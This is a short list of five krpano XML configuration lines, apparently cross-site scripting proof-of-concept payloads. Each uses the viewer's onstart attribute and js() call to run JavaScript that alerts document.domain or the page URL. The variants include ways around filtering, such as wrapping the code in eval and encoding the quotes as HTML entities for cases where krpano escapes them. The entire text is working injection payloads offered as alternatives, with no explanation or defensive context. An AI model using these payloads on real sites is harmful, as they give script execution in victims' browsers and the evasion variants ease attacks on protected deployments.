<!-- Alternative 1: With concatenation -->
<krpano version="1.18" onstart="js(alert('Domain: ' + document.domain));">

<!-- Alternative 2: Just the domain -->
<krpano version="1.18" onstart="js(alert(String(document.domain)));">

<!-- Alternative 3: Using eval -->
<krpano version="1.18" onstart="js(eval('alert(document.domain)'));">

<!-- Alternative 4: Multiple properties -->
<krpano version="1.18" onstart="js(alert('Domain: ' + document.domain + '\nURL: ' + window.location.href));">

<!-- Alternative 5: If Krpano is escaping quotes -->
<krpano version="1.18" onstart="js(alert(&quot;Domain: &quot; + document.domain));">
